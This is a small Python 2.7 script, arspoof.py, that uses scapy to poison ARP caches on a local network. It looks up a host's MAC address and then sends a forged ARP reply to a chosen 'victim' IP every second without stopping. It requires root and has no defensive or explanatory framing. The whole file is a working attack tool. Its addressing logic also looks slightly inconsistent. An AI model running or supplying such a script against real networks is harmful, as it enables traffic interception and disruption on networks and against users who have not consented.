#!/usr/bin/python2.7

import os
import sys
import re

from time import sleep
from scapy.layers.inet import (
    ARP,
    Ether,
    ETHER_BROADCAST,
    send,
    srp
)

def get_mac(ip_1):
    print("[\033[32m+\033[00m] Getting mac address")
    arping = Ether(dst = ETHER_BROADCAST) / ARP(pdst = ip_1)
    os.write(1, "[\033[32m+\033[00m] ")
    rep, norep = srp(arping, timeout = 2)
    for snd, rcv in rep:
        return rcv.sprintf(r"%Ether.src%")

def arspoof(ip_1, ip_2, regex_mac):
    trame = ARP(op = 2, psrc = ip_1, pdst = ip_2, hwdst = get_mac(ip_1))
    trame.show()
    if (re.match(regex_mac, trame.hwdst) == None):
        os.write(2, "[\033[31m-\033[00m] Error: mac adress must match with the regular expression.\n")
        exit(84)
    print("[\033[32m+\033[00m] Begin emission:")
    while (42):
        send(trame, verbose = 0)
        print(".\n[\033[32m+\033[00m] sent 1 packet to " + ip_2)
        sleep(1)

regex_ip = "([0-9]{1,3}\.){3}[0-9]{1,3}"
regex_mac = "([0-9a-f]{2}\:){5}[0-9a-f]{2}"

if (len(sys.argv) != 3 or sys.argv[1] == "-h"):
    print("USAGE:\n\t./arspoof.py <ip_target> <ip_victim>")
    exit(0)
if (os.getuid() != 0):
    os.write(2, "[\033[31m-\033[00m] The script must be run as root.\n")
    exit(84)
if (re.match(regex_ip, sys.argv[1]) == None or re.match(regex_ip, sys.argv[2]) == None):
    os.write(2, "[\033[31m-\033[00m] Error: ip adress must match with the regular expression.\n")
    exit(84)

ip_1 = sys.argv[1]
ip_2 = sys.argv[2]

arspoof(ip_1, ip_2, regex_mac)